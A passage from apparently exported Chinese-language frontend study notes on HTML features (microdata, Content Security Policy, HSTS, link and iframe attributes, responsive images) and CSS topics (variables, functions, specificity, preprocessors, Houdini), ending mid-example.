**介绍**：`<template>`标签，用于定义可重用的 HTML 片段\n- **特点**：\n\t- ==延迟渲染、提高性能、增强代码复用性。==\n\n## 13. **Shadow DOM**\n\n- **介绍**：Web Components 的一部分，用于封装元素的内部结构和样式。\n- **特点**：\n\t- 样式隔离、避免样式冲突、提高组件化开发。\n\n## 14. **自定义元素**\n\n- **介绍**：Web Components 的一部分，允许创建自定义的HTML标签。\n- **特点**：增强 HTML 的可扩展性、提高代码复用性、与框架无关。\n\n## 15. **响应式设计**\n\n- **介绍**：\n\t- 使用HTML 和 CSS 技术创建适应不同设备和屏幕尺寸的页面。\n- **特点**：\n\t- 媒体查询、弹性布局、视口设置。\n\n## 16. **微数据（Microdata）**\n\n- **介绍**：一种嵌入 HTML 的结构化数据的方式。\n- 目的: \n\t- 为 HTML元素 添加机器可读的标签, 描述其含义\n- **组成:** 主要由 `itemscope, itemtype, 和 itemprop 属性`组成。\n\t- itemscope: \n\t\t- 创建一个新的项目,表示其中包含的标记描述了一个特定的项目。\n\t- itemtype:\n\t\t- 指定项目的类型,通常是一个URL,指向一个词汇表或架构。\n\t- itemprop:  \n\t\t- 定义项目的属性\n- **特点**：==增强 SEO、提高搜索引擎理解页面内容的能力==。\n\t- 其实对于==大模型理解页面也有帮助==\n- 常用词汇表：Schema.org，最广泛使用的结构化数据词汇表，由主要搜索引擎共同支持。\n\n```html\n<div itemscope itemtype=\"http://schema.org/Person\">  \n  <span itemprop=\"name\">John Doe</span>\n  <span itemprop=\"jobTitle\">Software Developer</span>\n  <a href=\"mailto:john@example.com\" itemprop=\"email\">john@example.com</a>\n</div>  \n```\n\n>  https://developer.mozilla.org/zh-CN/docs/Web/HTML/Microdata\n\n## 17. **内容安全策略（CSP）**\n\n- **介绍**：一种Web安全策略，用于防止跨站脚本攻击（XSS）等安全威胁。\n- **特点**：定义允许加载的资源、提高安全性、减少攻击面。\n\n内容安全策略（`Content Security Policy`，简称CSP）是一种重要的Web安全机制，用于防止跨站脚本攻击（XSS）、数据注入等攻击。\n\n### 17.1. 基本概念\n\nCSP是一种由`服务器`声明的安全策略，它告诉`浏览器`哪些资源可以被`加载和执行`。\n\n### 17.2. 主要目标\n\n- 防止 XSS 攻击\n- 减少数据注入风险\n- 报告违规行为\n- 强制使用 `HTTPS`\n\n### 17.3. 工作原理\n\nCSP通过`HTTP 头部 或 meta 标签`来实现，指定允许加载的资源的来源。\n\n### 17.4. 实现方式\n\n#### 17.4.1. HTTP 头部方式\n\n```\nContent-Security-Policy: directive1 source1 source2; directive2 source3 source4\n```\n\n#### 17.4.2. Meta标签方式\n\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"directive1 source1 source2; directive2 source3 source4\">\n```\n\n### 17.5. 常用指令\n\n- `default-src`: 默认加载策略\n- `script-src`: JavaScript 来源\n- `style-src`: CSS 样式来源\n- `img-src`: 图片来源\n- `connect-src`: AJAX、WebSocket 等连接来源\n- `font-src`: 字体文件来源\n- `object-src`: 插件来源（如 Flash）\n- `media-src`: 音视频来源\n- `frame-src`: iframe 来源\n\n> **即规定了所有可能加载资源的来源要求**\n\n### 17.6. 示例\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; img-src *\n```\n\n这个策略允许：\n\n- 默认只加载同源资源\n- 脚本只能从自身域名和 trusted.cdn.com 加载\n- 图片可以从任何源加载\n\n### 17.7. 报告模式\n\n可以使用`Content-Security-Policy-Report-Only`头部来测试策略，不实际阻止资源，只报告违规。\n\n### 17.8. 违规报告\n\n可以通过`report-uri`指令指定违规报告的**接收地址**。\n\n### 17.9. 优势\n\n- 大幅降低 XSS 风险\n- 控制资源加载，提高安全性\n- **强制使用 HTTPS**，保护数据传输\n- 提供违规报告，便于监控和调试\n\n### 17.12. 与其他安全措施的结合： → ==强制使用 HTTPS 链接==\n\n- HSTS (HTTP Strict Transport Security)\n\t- HSTS 是一个重要的网络安全机制，它通过**强制 HTTPS 连接**来提供更好的安全保护\n\t- 响应头配置示例：\n\t\t- `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`\n- X-Frame-Options\n- X-XSS-Protection\n\n## 18. **Web Components**\n\n- **介绍**：一组Web平台API，用于创建可复用的自定义元素。\n- **特点**：组件化开发、样式和功能封装、与框架无关。\n\n## 19. **媒体查询**\n\n- **介绍**：用于在不同设备和屏幕尺寸上应用不同的CSS样式。\n- **特点**：响应式设计、提高用户体验、适应多种设备。\n","4ZHvghU6":"\n# HTML 标签\n\n\n`#前端` `#HTML` `#R2` \n\n你可以通过下面的清单来检测自己对于 HTML 标签的了解是否全面\n\n- HTML 简介\n- HTML 的标准规范有哪些？\n- URL ：通过 a 标签，构建了互联网\n- 标签语义\n- 全局属性：比如 `spellcheck/translate` 是做什么用的？\n\t- 拼写和翻译\n- HTML的字符实体表示方法：为什么？\n   - 网页使用 utf-8 ，那么类似于`<p>` 中的 `<` 如何表示呢？\n- `a 标签`\n\t- 它的下面这些属性都是干嘛的？\n\t\t- [href](https://wangdoc.com/html/a#href)\n\t\t- [hreflang](https://wangdoc.com/html/a#hreflang)\n\t\t- [title](https://wangdoc.com/html/a#title)\n\t\t- [target](https://wangdoc.com/html/a#target)\n\t\t- [rel](https://wangdoc.com/html/a#rel)\n\t\t- [referrerpolicy](https://wangdoc.com/html/a#referrerpolicy)\n\t\t- [ping](https://wangdoc.com/html/a#ping)：**用于打点**\n\t\t- [type](https://wangdoc.com/html/a#type)\n\t\t- [download](https://wangdoc.com/html/a#download) ：==用于下载==\n\t- 发邮件：调用邮件客户端\n\t- 打电话：H5\n- link 标签\n\t- rel：全称 `relationship`\n\t\t- 预加载相关：preload / prefetch /dns-prefetch / prerender / preconnect\n\t\t- 其他：比如 icon / stylessheet 等\n\t- media：媒体查询\n\t- **crossorigin ：跨域访问相关**\n\t- manifest：文件清单\n\t- 更多参考 [<link>](https://wangdoc.com/html/link#hreflang-%E5%B1%9E%E6%80%A7)\n- `<script> 、<noscript>`\n\t- type \n\t- async/defer\n\t- `crossorigin`\n\t- `integrity`：哈希防篡改\n\t- `nonce`：密码随机值，配合服务器，只有白名单才执行\n- iframe\n\t- `sandbox`：**沙盒权限属性**，==比如是否允许提交表单、是否允许提示框等等==\n\t- `importance`：下载优先级\n\t- `loading`: auto / lazy / eager \n- `table` 相关标签都有哪些\n\t- 如何合并单元格 \n\t\t- 使用 `colspan` 属性来实现==水平方向==的单元格合并\n\t\t- 使用 `rowspan` 属性来实现==垂直方向==的单元格合并。\n- `details/summary/dialog 标签`是干什么用的 ？ \n- form \n\t- input type 有哪些 ？\n\t- 每种 type 有不同的属性：\n\t\t- 比如 min/pattern/autocomplete ...\n\t- 更多参考：[表单标签](https://wangdoc.com/html/form#meter)\n\n","vdR2PGuV":"\n# Web Components\n\n`#前端` `#HTML`  \n\nWeb 组件标准由三部分组成：[HTML 模板](https://developer.mozilla.org/docs/Web/Web_Components/Using_templates_and_slots)、[自定义元素](https://developer.mozilla.org/docs/Web/Web_Components/Using_custom_elements) 和 [Shadow DOM](https://developer.mozilla.org/docs/Web/Web_Components/Using_shadow_DOM)\n\n> 更多参考：[Web Component - Web API | MDN](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_components)\n\n\n>  更多详见 [12.  Shadow dom 与 Web Component](/post/OmI51GKU.html)\n\n","zYsMKVYW":"\n# HTML 标准规范\n\n\n`#HTML` `#前端/HTML`  \n\n>  what + wp\n\n- **WHATWG** 全称是 `Web Hypertext Application Technology Working Group`，即 `Web 超文本应用技术工作组`\n- WHATWG HTML 规范：\n\t- 定义了 HTML 的语法和行为，涵盖了网页开发的**所有**方面，确保网页在不同浏览器中的一致性。\n- ARIA（Accessible Rich Internet Applications 规范：\n\t- 专注于增强网页的无障碍性，使得辅助技术用户能够更好地访问和操作网页内容\n\t- 主要定义了一组属性，比如如 role、aria-label、aria-hidden、aria-live 等，用于增强现有 HTML 元素的语义信息。\n","o9VWkhSv":"\n# 响应式图片\n\n\n`#HTML` `#前端`\n\n图片响应式设计**旨在根据不同设备和屏幕尺寸提供适合的图片资源**，以提高页面加载速度和用户体验。\n\n\n## 目录\n<!-- toc -->\n ## 1. 背景和重要性 \n\n响应式图片技术通过提供不同尺寸和分辨率的图片，确保在各种设备上都能获得最佳的显示效果和性能。\n\n## 2. 基本概念\n\n- **响应式图片**: \n\t- 根据设备特性（如屏幕尺寸、分辨率等）动态选择和加载合适的图片。\n- **视口（Viewport）**:\n\t-  用户设备的可视区域。\n- **DPR（Device Pixel Ratio）**: \n\t- 设备像素比，表示设备物理像素与CSS像素的比例。\n\n## 3. 实现方法\n\n### 3.1. 使用 `srcset` 和 `sizes` 属性\n\n`srcset` 和 `sizes` 属性是 HTML5 中引入的，用于指定不同分辨率和尺寸的图片资源。\n\n```html\n<img src=\"small.jpg\" \n     srcset=\"small.jpg 500w, medium.jpg 1000w, large.jpg 1500w\" \n     sizes=\"(max-width: 600px) 480px, (max-width: 1200px) 800px, 100vw\" \n     alt=\"Responsive Image\">\n```\n\n- `srcset`: 定义一组图片资源及其对应的宽度描述符（如 500w 表示 500像素宽）\n- `sizes`: 定义图片在不同视口宽度下的显示尺寸（如`(max-width: 600px) 480px`表示视口宽度小于600px时图片宽度为480px）。\n\n浏览器会**根据视口大小和设备像素比**自动选择最合适的图片进行加载。\n\n### 3.2. 使用 `<picture>` 元素\n\n`<picture>` 元素提供了**更强大的响应式图片支持**，可以根据不同的媒体条件加载不同的图片资源。\n\n```html\n<picture>\n  <source media=\"(max-width: 600px)\" srcset=\"small.jpg\">\n  <source media=\"(max-width: 1200px)\" srcset=\"medium.jpg\">\n  <img src=\"large.jpg\" alt=\"Responsive Image\">\n</picture>\n\n```\n\n- `<source>`: \n\t- 定义不同的媒体条件和对应的图片资源\n- `<img>`: \n\t- 定义默认图片，当所有媒体条件都不满足时加载\n\n## 4. 示例\n\n### 4.1. 使用 `srcset` 和 `sizes`\n\n```html\n<img src=\"images/default.jpg\"\n     srcset=\"images/small.jpg 480w, images/medium.jpg 800w, images/large.jpg 1200w\"\n     sizes=\"(max-width: 600px) 480px, (max-width: 1200px) 800px, 100vw\"\n     alt=\"Example of responsive image\">\n```\n\n### 4.2. 使用 `<picture>` 元素\n\n```html\n<picture>\n  <source media=\"(max-width: 600px)\" srcset=\"images/small.jpg\">\n  <source media=\"(max-width: 1200px)\" srcset=\"images/medium.jpg\">\n  <img src=\"images/large.jpg\" alt=\"Example of responsive image\">\n</picture>\n\n```\n\n## 5. 优势\n\n- **提高性能**: 通过加载适合的图片资源，减少不必要的带宽消耗，提高页面加载速度。\n- **优化用户体验**: 确保在不同设备上都能获得最佳的图片显示效果。\n- **SEO友好**: 提供合适的图片资源，有助于搜索引擎优化。\n\n## 6. 注意事项\n\n- **图片格式**: \n\t- 使用现代`图片格式（如WebP）`可以进一步优化图片加载性能。\n- **缓存策略**: \n\t- 合理设置图片的缓存策略，减少重复加载。\n- **测试和优化**: \n\t- 在不同设备和浏览器上测试响应式图片效果，确保兼容性和性能。\n\n## 7. 工具和资源\n\n- **图片生成工具**: \n\t- 使用工具（如ImageMagick）批量生成不同尺寸和分辨率的图片。\n\t- **最好集成到工程构建里面**\n- **在线服务**: \n\t- 使用在线服务（如Cloudinary）自动生成和管理响应式图片资源。\n- **浏览器开发者工具**: \n\t- 使用浏览器开发者工具测试和调试响应式图片效果。\n\n","RpbiIboJ":"\n# HTML 模板语言\n\n\n`#HTML`  `#前端`\n\nHTML 模板语言是一种用于生成动态 HTML 内容的工具，通常用于 Web 开发中以简化和自动化 HTML 代码的生成，比如\n\n- `Handlebars.js` ，适用于前端和后端渲染\n- `Nunjucks`，适用于前端和后端渲染\n- `pug/ejs` ，适用于 `nodejs`\n- 还有 \n\t- php：\n\t\t- `smarty `\n\t- java：\n\t\t- `jsp / Velocity`\n\n","Cm3vzDMF":"\n# CSS 篇\n\n\n`#前端/CSS` \n\n> CSS 相关的笔记\n\n\n## 目录\n<!-- toc -->\n ## 1. 参考 \n\n- [GPT-4o](https://chatgpt.com/)\n- [Claude 3.5 Sonnet](https://www.anthropic.com/news/claude-3-5-sonnet?locale=zh_CN)\n- [https://www.w3.org/Style/CSS/#specs](https://www.w3.org/Style/CSS/#specs)\n- [CSS：层叠样式表 | MDN](https://developer.mozilla.org/zh-CN/docs/Web/CSS)\n- [https://web.dev/learn/css/color?hl=zh-cn](https://web.dev/learn/css/color?hl=zh-cn)\n\n## 2. 推荐书籍\n\n- 《CSS 揭秘》\n\n","TMDSil0i":"\n# CSS 简介\n\n\n`#css`  `#前端/CSS`   \n\n> 即为 HTML 添加样式\n","jv2k0TJK":"\n# CSS 定位\n\n\n`#前端/CSS`  \n\n- 静态定位（Static Positioning）\n- 相对定位（Relative Positioning）\n- 绝对定位（Absolute Positioning）\n- 固定定位（Fixed Positioning）\n- 粘性定位（`Sticky` Positioning）\n\n> 不展开了\n","ugKr8PgZ":"\n# 滚动自动吸附效果与吸顶效果\n\n\n`#前端/CSS`\n\n\n## 目录\n<!-- toc -->\n ## 1. CSS 滚动自动吸附效果如何实现？ \n\n`CSS Scroll Snap` 用于创建更流畅、更控制的滚动体验，确保滚动容器滚动到`预定义`的位置，使用户可以`精确地滚动到相邻的部分`\n\n- **描述**：提供了一种控制滚动行为的方式，使滚动条在指定位置停止。\n- **特点**：适用于创建滑动视图和画廊。\n- **示例**：\n```css\n.container {\n  scroll-snap-type: x mandatory;\n}\n.item {\n  scroll-snap-align: center;\n}\n```\n\n可以理解为幻灯片的效果，或者画廊滚动的效果，具体效果可参考：[https://codepen.io/chriscoyier/full/pMRgwW](https://codepen.io/chriscoyier/full/pMRgwW)\n\n具体 CSS Scroll Snap 属性包括如下：\n\n- [scroll-snap-type](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-snap-type)\n- [scroll-padding](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding)\n   - [scroll-padding-top](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-top)\n   - [scroll-padding-right](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-right)\n   - [scroll-padding-bottom](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-bottom)\n   - [scroll-padding-left](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-left)\n   - [scroll-padding-inline](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-inline)\n   - [scroll-padding-inline-start](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-inline-start)\n   - [scroll-padding-inline-end](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-inline-end)\n   - [scroll-padding-block](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-block)\n   - [scroll-padding-block-start](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-block-start)\n   - [scroll-padding-block-end](https://developer.mozilla.org/zh-CN/docs/Web/CSS/scroll-padding-block-end)\n\n> 如何使用具体参考上面的链接即可\n\n## 2. 上面说的 css 的`自动吸附效果`和`吸顶`有什么区别吗？\n\n- `position: sticky` \n\t- 主要用于使元素在滚动时`粘性`地保持在其父元素的某个位置。\n- `CSS Scroll Snap` \n\t- 主要用于创建更流畅和可控制的滚动体验，通过自动捕捉和对齐滚动点来提升用户体验。\n","4jEqoAZO":"\n# CSS 变量\n\n\n`#前端/CSS`\n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\nCSS 变量使用 `--` 作为前缀来定义，并且通常定义在 `:root` 选择器中，以便在整个文档中全局可用。\n\n```css\n:root {\n  --main-color: `#3498db;`\n  --padding-size: 10px;\n  --font-size: 16px;\n}\n```\n\nCSS 变量可以存储**任何合法的 CSS 值**，包括颜色、长度、百分比、字符串等\n\n## 2. 使用 CSS 变量\n\n使用 `var()` 函数来引用 CSS 变量。\n\n```css\n.element {\n  color: var(--main-color);\n  padding: var(--padding-size);\n  font-size: var(--font-size);\n}\n```\n\n## 3. 变量的作用域\n\nCSS 变量的作用域可以是全局的（定义在 `:root` 中）或局部的（定义在特定选择器中）。\n\n### 3.1. 全局变量\n\n定义在 `:root` 中的变量可以在==整个文档==中使用。\n\n```css\n:root {\n  --global-color: `#3498db;`\n}\n.element {\n  color: var(--global-color);\n}\n```\n\n### 3.2. 局部变量\n\n定义在特定选择器中的变量只能在该选择器及其子元素中使用。\n\n```css\n.container {\n  --local-color: `#e74c3c;`\n}\n.element {\n  color: var(--local-color); /* 仅在 .container 内部有效 */\n}\n```\n\n## 4. 变量的默认值\n\n`var()` 函数可以接受一个可选的`第二个参数`作为默认值，当变量未定义时使用该默认值。\n\n```css\n.element {\n  color: var(--undefined-color, `#2ecc71);` /* 如果 --undefined-color 未定义，则使用 `#2ecc71` */\n}\n```\n\n## 5. 嵌套变量\n\nCSS 变量可以嵌套使用，即一个变量的值可以引用另一个变量。\n\n```css\n:root {\n  --primary-color: `#3498db;`\n  --secondary-color: var(--primary-color);\n}\n.element {\n  color: var(--secondary-color); /* 等同于 `#3498db` */\n}\n```\n\n## 6. 变量的计算\n\nCSS 变量可以与其他 CSS 属性值一起使用，并且可以参与计算。\n\n```css\n:root {\n  --base-padding: 10px;\n}\n.element {\n  padding: calc(var(--base-padding) * 2); /* 等同于 20px */\n}\n```\n\n## 7. 动态更新变量\n\nCSS 变量的值可以**通过 JavaScript 动态更新**，从而实现动态样式更改。\n\n```html\n<style>\n  :root {\n    --dynamic-color: `#3498db;`\n  }\n  .element {\n    color: var(--dynamic-color);\n  }\n</style>\n\n<div class=\"element\">Hello World</div>\n\n<script>\n  document.documentElement.style.setProperty('--dynamic-color', '#e74c3c');\n</script>\n\n```\n\n## 8. 变量的继承\n\nCSS 变量遵循 CSS 的继承规则，子元素可以继承父元素定义的变量\n\n```css\n.parent {\n  --inherited-color: `#3498db;`\n}\n.child {\n  color: var(--inherited-color); /* 继承自 .parent */\n}\n```\n\n## 9. 变量的类型\n\nCSS 变量可以存储任何合法的 CSS 值，包括==颜色、长度、百分比、字符串==等。\n\n```css\n:root {\n  --color: `#3498db;`\n  --padding: 10px;\n  --font: 'Arial, sans-serif';\n}\n.element {\n  color: var(--color);\n  padding: var(--padding);\n  font-family: var(--font);\n}\n```\n\n## 10. CSS @property\n\n- 描述：用于**注册自定义属性**，并定义其初始值和继承行为\n- 特点：增强了 CSS 变量的功能。\n- 示例：\n```css\n@property --main-color {\n  syntax: '<color>';\n  initial-value: `#3498db;`\n  inherits: true;\n}\n```\n\n\n\n\n\n","x1l4aan5":"\n# CSS 的计算属性\n\n\n`#前端/CSS` \n\n在 CSS 中，计算属性（也称为计算值）是指那些可以通过==数学运算、函数或其他方式动态计算==的属性值。\n\n\n## 目录\n<!-- toc -->\n ## 1. `calc()` \n\n`calc()` 函数允许你在 CSS 属性中进行基本的数学运算（加、减、乘、除）。\n```css\n.element {\n  width: calc(100% - 50px);\n  height: calc(50vh + 20px);\n  margin: calc(10px * 2);\n}\n```\n\n## 2. `var()`\n\n`var()` 函数用于**引用 CSS 变量**。这些变量可以包含计算值。\n\n```css\n:root {\n  --base-size: 10px;\n}\n\n.element {\n  padding: calc(var(--base-size) * 2);\n}\n```\n\n## 3. `min()`, `max()`, `clamp()`\n\n这些函数允许你在多个值之间进行选择\n\n- `min()` 返回最小值\n- `max()` 返回最大值\n- `clamp()` 返回一个==在指定范围内的值==\n\n```css hl:3\n.element {\n  width: min(50vw, 500px); /* 取 50vw 和 500px 中的最小值 */\n  height: max(100px, 10vh); /* 取 100px 和 10vh 中的最大值 */\n  font-size: clamp(1rem, 2vw, 3rem); /* 字体大小在 1rem 到 3rem 之间，取 2vw */\n}\n```\n\n> 平时很少使用\n\n## 4. `attr()`\n\n`attr()` 函数允许你在 CSS 中使用 HTML 属性的值。虽然这个函数的支持仍然有限，但它可以用于一些简单的场景。\n\n```css\n.element::before {\n  content: attr(data-content);\n}\n```\n\n## 5. `env()`\n\n`env()` 函数用于`访问环境变量`，例如**安全区域（safe area）内边距**。\n\n```css\n.element {\n  padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);\n}\n```\n\n## 6. `url()`\n\n`url()` 函数用于引用外部资源，例如图像、字体等\n\n```css\n.element {\n  background-image: url('path/to/image.jpg');\n}\n```\n\n## 7. `rgba()`, `hsla()`\n\n这些函数用于定义颜色，可以包含计算值。\n\n```css\n.element {\n  background-color: rgba(255, 0, 0, 0.5); /* 半透明的红色 */\n  color: hsla(120, 100%, 50%, 0.3); /* 半透明的绿色 */\n}\n```\n\n## 8. `repeat()`\n\n`repeat()` 函数用于在 CSS Grid 布局中重复轨道定义。\n\n```css\n.grid {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr); /* 三列，每列平分 */\n}\n```\n\n## 9. `fit-content()`  → ==这个平时常用==\n\n`fit-content()` 函数用于定义一个==自适应内容的大小==。\n\n```css hl:2\n.element {\n  width: fit-content(200px); /* 根据内容自适应宽度，不超过 200px */\n}\n```\n\n## 10. `rotate()`, `scale()`, `translate()`, `skew()`\n\n这些变换函数用于定义元素的变换效果\n\n```css\n.element {\n  transform: rotate(45deg) scale(1.5) translate(10px, 20px);\n}\n```\n\n## 11. `cubic-bezier()`, `steps()`\n\n这些函数用于定义动画的时间函数。\n\n```css\n.element {\n  transition: all 0.5s cubic-bezier(0.25, 0.1, 0.25, 1);\n  animation-timing-function: steps(4, end);\n}\n```\n\n## 12. `conic-gradient()` \n\n`conic-gradient()` 函数用于创建圆锥渐变。\n\n```css\n.element {\n  background: conic-gradient(from 0deg at 50% 50%, red, yellow, green, blue);\n}\n```\n\n## 13. `linear-gradient()`\n\n`linear-gradient()` 函数用于创建线性渐变。\n\n```css\n.element {\n  background: linear-gradient(to right, red, yellow, green);\n}\n```\n\n## 14. `radial-gradient()`\n\n`radial-gradient()` 函数用于创建径向渐变。\n\n```css\n.element {\n  background: radial-gradient(circle, red, yellow, green);\n}\n```\n\n## 15. `repeating-linear-gradient()`\n\n`repeating-linear-gradient()` 函数用于创建重复的线性渐变。\n\n```css\n.element {\n  background: repeating-linear-gradient(45deg, red, yellow 10%, green 20%);\n}\n```\n\n## 16. `repeating-radial-gradient()`\n\n`repeating-radial-gradient()` 函数用于创建重复的径向渐变。\n\n```css\n.element {\n  background: repeating-radial-gradient(circle, red, yellow 10%, green 20%);\n}\n```\n\n## 17. `hsl()`, `hsla()`\n\n`hsl()` 和 `hsla()` 函数用于定义 `HSL 颜色值`，可以包含计算值\n\n```css hl:2\n/* HSL 语法 */\ncolor: hsl(色相, 饱和度, 亮度);\n/* HSLA 语法（带透明度） */\ncolor: hsla(色相, 饱和度, 亮度, 透明度);\n\n.element {\n  color: hsl(120, 100%, 50%);\n  background-color: hsla(240, 100%, 50%, 0.5);\n}\n```\n\n## 18. `rotateX()`, `rotateY()`, `rotateZ()\n\n这些 3D 变换函数用于定义元素的旋转效果。\n\n```css\n.element {\n  transform: rotateX(45deg) rotateY(30deg) rotateZ(60deg);\n}\n```\n\n## 19. `scaleX()`, `scaleY()`, `scaleZ()`\n\n这些 3D 变换函数用于定义元素的缩放效果\n\n```css\n.element {\n  transform: scaleX(1.2) scaleY(0.8) scaleZ(1.5);\n}\n```\n\n## 20. `translateX()`, `translateY()`, `translateZ()`\n\n这些 3D 变换函数用于定义元素的平移效果。\n\n```css\n.element {\n  transform: translateX(10px) translateY(20px) translateZ(30px);\n}\n```\n\n## 21. `skewX()`, `skewY()`\n\n这些变换函数用于定义元素的倾斜效果。\n\n```css\n.element {\n  transform: skewX(30deg) skewY(20deg);\n}\n```\n\n## 22. `matrix()`, `matrix3d()`\n\n这些函数用于定义 2D 和 3D 变换矩阵。\n\n```css\n.element {\n  transform: matrix(1, 0, 0, 1, 50, 100); /* 2D 变换矩阵 */\n  transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 50, 100, 0, 1); /* 3D 变换矩阵 */\n}\n```\n\n## 23. `perspective()`\n\n`perspective()` 函数用于==定义 3D 透视效果==。\n\n```css\n.element {\n  transform: perspective(500px) rotateY(45deg);\n}\n```\n\n## 24. `path()`\n\n`path()` 函数用于定义一个路径，常用于 `clip-path` 属性\n\n```css\n.element {\n  clip-path: path('M10 10 H 90 V 90 H 10 L 10 10');\n}\n```\n\n## 25. `circle()`, `ellipse()`, `inset()`, `polygon()`\n\n这些函数用于定义`裁剪路径`（clip path）。\n\n```css\n.element {\n  clip-path: circle(50% at 50% 50%);\n  clip-path: ellipse(50% 50% at 50% 50%);\n  clip-path: inset(10% 20% 30% 40%);\n  clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);\n}\n```\n\n## 26. `counter()`, `counters()`\n\n这些函数用于**生成计数器**内容\n\n```css\nol {\n  counter-reset: section;\n}\n\nli::before {\n  counter-increment: section;\n  content: counter(section) \". \";\n}\n```\n\n## 27. `rotate3d()`\n\n`rotate3d()` 函数用于定义**沿着任意轴的 3D 旋转**。\n\n```css\n.element {\n  transform: rotate3d(1, 1, 0, 45deg);\n}\n```\n\n## 28. `translate3d()`\n\n`translate3d()` 函数用于定义 3D 平移\n\n```css\n.element {\n  transform: translate3d(10px, 20px, 30px);\n}\n```\n\n","jI5Py5YO":"\n# CSS 处理器\n\n\n`#css` `#前端/CSS` \n\n又分为 `前置处理器（预处理器）`和 `后置处理器（后处理器）`\n\n\n## 目录\n<!-- toc -->\n ## 1. CSS 前置处理器（预处理器） \n\n- Sass/SCSS\n\t- Sass (Syntactically Awesome Style Sheets)\n- Less (Leaner CSS)\n- Stylus\n\n## 2. CSS 后置处理器（后处理器）\n\n代表\n\n- PostCSS（虽然它也可以作为预处理器使用）\n- `Autoprefixer`（自动添加浏览器前缀）\n- CSS Nano（压缩和优化 CSS）\n\n## 3. CSS-in-JS\n\n将 CSS 写入 JavaScript 代码中的技术，比如 styled-components、Emotion、JSS 等。\n\n","Acgwuful":"\n# CSS 选择器的优先级\n\n\n`#前端/CSS` \n\n\n## 目录\n<!-- toc -->\n ## 1. 特异性（Specificity） ：优先级 \n\nCSS 选择器的优先级由四个数值组成，用来计算选择器的`特异性（Specificity）`。这些数值从高到低分别是：\n\n- 内联样式：如果样式是通过元素的 `style` 属性内联定义的，例如 `<div style=\"color: red;\"></div>`。\n\t- 特异性（Specificity）：==1000==\n- ID 选择器：例如 `#id`\n\t- 特异性（Specificity）：==100==\n- `类选择器、属性选择器`和`伪类选择器`：例如 `.class`、`[type=\"text\"]`、`:hover`\n\t- 特异性（Specificity）：==10==\n- 元素选择器 和`伪元素`选择器：例如 `div`、`p`、`::before`\n\t- 特异性（Specificity）：==1==\n- 通配符选择器（`*`）\n\t- 特异性（Specificity）：==0==\n\n> 特异性（Specificity） 即 优先级\n\n## 2. 示例\n\n1. `style=\"color: red;\"` 内联样式，特异性值为 `1000`\n2. `#idSelector` ID 选择器，特异性值为 `100`\n3. `.classSelector` 类选择器，特异性值为 `10`\n4. `[type=\"text\"]` 属性选择器，特异性值为 `10`\n5. `:hover` 伪类选择器，特异性值为 `10`\n6. `div` 元素选择器，特异性值为 `1`\n\n## 3. `important`\n\n1. `!important` 提升声明的优先级，覆盖任何通常的权重计算\n2. 任意规则使用 `!important`，该规则将优先权\n3. 多个 `!important`之间情况，优先级基于特异性\n\n## 4. 总结\n\n以下优先级从高到低：\n\n1. `!important` 声明\n2. 内联样式（`style 属性`） \n\t-  → 1000\n3. ID 选择器（`#id`）   \n\t- → 100\n4. 类选择器（`.class`）、属性选择器（`[attr]`）和 `伪类（:hover 等）`  \n\t- 10\n5. 元素选择器（`div, p 等`）和 `伪元素（::before, ::after 等`）\n\t- 1\n6. 通配符选择器（`*`）\n\t- 0\n\n> 是有一个很详细的计算公式的，CSS 引擎会严格计算具体的值\n\n","k5hx7183":"\n# CSS Houdini API\n\n\n`#前端/CSS` \n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n- **描述**：一组低级 API，允许开发者扩展 CSS 的功能。\n- **特点**：可以创建自定义的 CSS 属性、值和渲染逻辑。\n- **示例**：使用 Houdini Paint API 创建自定义背景图案。\n- workLets 是干什么的？\n\n![image.png|535](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/fbc8c2fd3e2020705eca7a56269f9619.png)\n\n![image.png|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/66aa45d5394512e154f5316bb589f85f.png)\n\n## 2. CSS Paint API (Worklet)\n\n>  `paint()` 是 CSS Houdini 中的 Paint API 提供的一个 CSS 函数，它允许我们使用自定义的 `Paint Worklet` 来绘制图像\n\n```javascript hl:1\n// 注册一个 Paint Worklet\nCSS.paintWorklet.addModule('my-paint-worklet.js');\n\n// paint-worklet.js\nclass CirclePainter {\n    static get inputProperties() {\n        return ['--circle-color'];\n    }\n    \n    paint(ctx, size, properties) {\n        const color = properties.get('--circle-color');\n        const centerX = size.width / 2;\n        const centerY = size.height / 2;\n        \n        ctx.fillStyle = color;\n        ctx.beginPath();\n        ctx.arc(centerX, centerY, Math.min(centerX, centerY), 0, 2 * Math.PI);\n        ctx.fill();\n    }\n}\n\nregisterPaint('circle', CirclePainter);\n```\n\n```css\n/* 使用自定义画笔 */\n.circle {\n    --circle-color: blue;\n    background-image: paint(circle); // \n}\n```\n\n## 3. CSS Properties and Values API\n\n```javascript hl:1,2\n// 注册自定义属性\nCSS.registerProperty({\n    name: '--my-color',\n    syntax: '<color>',\n    inherits: false,\n    initialValue: '#c0ffee'\n});\n```\n\n```css\n/* 使用自定义属性 */\n.element {\n    --my-color: `#ff0000;`\n    color: var(--my-color);\n}\n```\n\n## 4. CSS Layout API\n\n```javascript\n// 注册自定义布局\nregisterLayout('masonry', class {\n    static get inputProperties() {\n        return ['--columns'];\n    }\n    \n  